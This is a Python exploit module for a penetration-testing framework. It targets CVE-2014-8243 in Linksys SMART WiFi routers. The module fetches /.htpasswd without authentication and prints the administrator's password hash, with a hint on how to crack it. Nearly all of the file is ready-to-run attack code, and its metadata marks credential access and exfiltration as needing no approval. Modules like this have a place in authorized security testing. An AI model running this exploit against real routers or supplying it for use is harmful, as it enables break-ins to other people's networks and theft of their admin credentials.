#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Linksys SMART WiFi Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Linksys SMART WiFi Password Disclosure',
        'description': "Exploit implementation for Linksys SMART WiFi Password Disclosure vulnerability. If target is vulnerable administrator\\'s MD5 passsword is retrieved.",
        'author': ['Sijmen Ruwhof', '0BuRner'],
        'cve': ['CVE-2014-8243'],
        'platform': Platform.LINUX,
        'references': ['https://www.kb.cert.org/vuls/id/447516', 'http://sijmen.ruwhof.net/weblog/268-password-hash-disclosure-in-linksys-smart-wifi-routers', 'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8243', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8243'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'cve-2014-8243', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            response = self.http_request(
                method="GET",
                path="/.htpasswd"
            )
            if response is None:
                print_error("Exploit failed - connection error")
                return

            if (response.text.find('$') != -1):
                print_info("Likely Unix crypt hash: $id$salt$hashed")  # See more at http://man7.org/linux/man-pages/man3/crypt.3.html
            else:
                print_info("Likely base64 encoded .htaccess")  # John understands this natively

            print_success("Hash found:", response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):

        response = self.http_request(
            method="GET",
            path="/.htpasswd"
        )

        if response is not None and response.status_code == 200:
            res = re.findall(r"^([a-zA-Z0-9]+:\S+)", response.text)
            if len(res):
                return True

        return False
